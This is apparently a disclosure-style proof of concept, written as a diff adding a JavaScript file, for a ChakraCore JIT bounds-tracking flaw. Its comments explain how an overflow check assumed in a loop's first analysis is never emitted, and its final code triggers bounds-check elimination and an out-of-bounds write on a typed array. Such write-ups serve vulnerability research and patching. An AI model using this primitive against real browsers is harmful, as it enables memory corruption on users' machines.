@@ -1,0 +1,79 @@
+/*
+Let's start with comments in the "GlobOpt::TrackIntSpecializedAddSubConstant" method.
+            // Track bounds for add or sub with a constant. For instance, consider (b = a + 2). The value of 'b' should track
+            // that it is equal to (the value of 'a') + 2. That part has been done above. Similarly, the value of 'a' should
+            // also track that it is equal to (the value of 'b') - 2.
+
+This means "j" will be guaranteed to be in the range of INT_MIN to 15(INT_MAX - 0x7ffffff0) at (a) in the following code. In detail, it uses "BailOutOnOverflow", which makes the JITed code bailout when an integer overflow occurs, to ensure the range.
+
+function opt(j) {
+    let k = j + 0x7ffffff0;
+    // (a)
+}
+
+
+But if integer overflows continuously occur in the JITed code or it's known that "k" doesn't fit in an int at compile time, Chakra considers "k" to be a float.
+
+For example, in the following code where "j" is always greater than 100, "k" is considered a float. So it doesn't use "BailOutOnOverflow" for the add operation.
+
+function opt(j) {
+    if (j <= 100)
+        return;
+
+    let k = j + 0x7ffffff0;
+}
+
+
+Now, let's take a look at the PoC.
+
+function opt() {
+    let j = 0;
+    for (let i = 0; i < 2; i++) {
+        // (a)
+        j += 0x100000;
+        // (b)
+        let k = j + 0x7ffffff0; // (c)
+    }
+}
+
+Note that all loops are analyzed twice in the JIT optimization process.
+
+Here's what happens in the analyses.
+
+In the first analysis:
+At (b), Chakra considers "j" to be in the range of INT_MIN to INT_MAX.
+At (c), INT_MAX + 0x7ffffff0 overflows but INT_MIN + 0x7ffffff0 doesn't, so it assumes "k" may fit in an int and that "BailOutOnOverflow" will be used to ensure "j" to be in the range of INT_MIN to 15.
+
+In the second analysis:
+At (a), Chakra considers "j" to be in the range of 0 to 15.
+At (b), Chakra considers "j" to be in the range of 0x100000 to 0x10000f.
+At (c), in both cases of 0x100000 + 0x7ffffff0 and 0x10000f + 0x7ffffff0, an integer overflow occurs. So "k" is considered a float.
+
+
+In the first analysis, it made two assumptions: "k" will be an int, and therefore "BailOutOnOverflow" will be used. But actually, both assumptions are wrong. "k" will be a float. And "BailOutOnOverflow" will never be used.
+
+However it's already guaranteed "j" to be in the range of INT_MIN to 15 at (a) based on the wrong assumptions. We can abuse this.
+
+PoC demonstrating OOB write:
+*/
+function opt(arr) {
+    if (arr.length <= 15)
+        return;
+
+    let j = 0;
+    for (let i = 0; i < 2; i++) {
+        arr[j] = 0x1234;  // (a)
+        j += 0x100000;
+        j + 0x7ffffff0;
+    }
+}
+
+function main() {
+    for (let i = 0; i < 0x10000; i++) {
+        opt(new Uint32Array(100));
+    }
+}
+
+main();
+
+// At (a), Chakra considers "j" to be always in the range of INT_MIN to 15, the length of "arr" has been already guaranteed to be upper than 15, so it eliminates the bounds check.
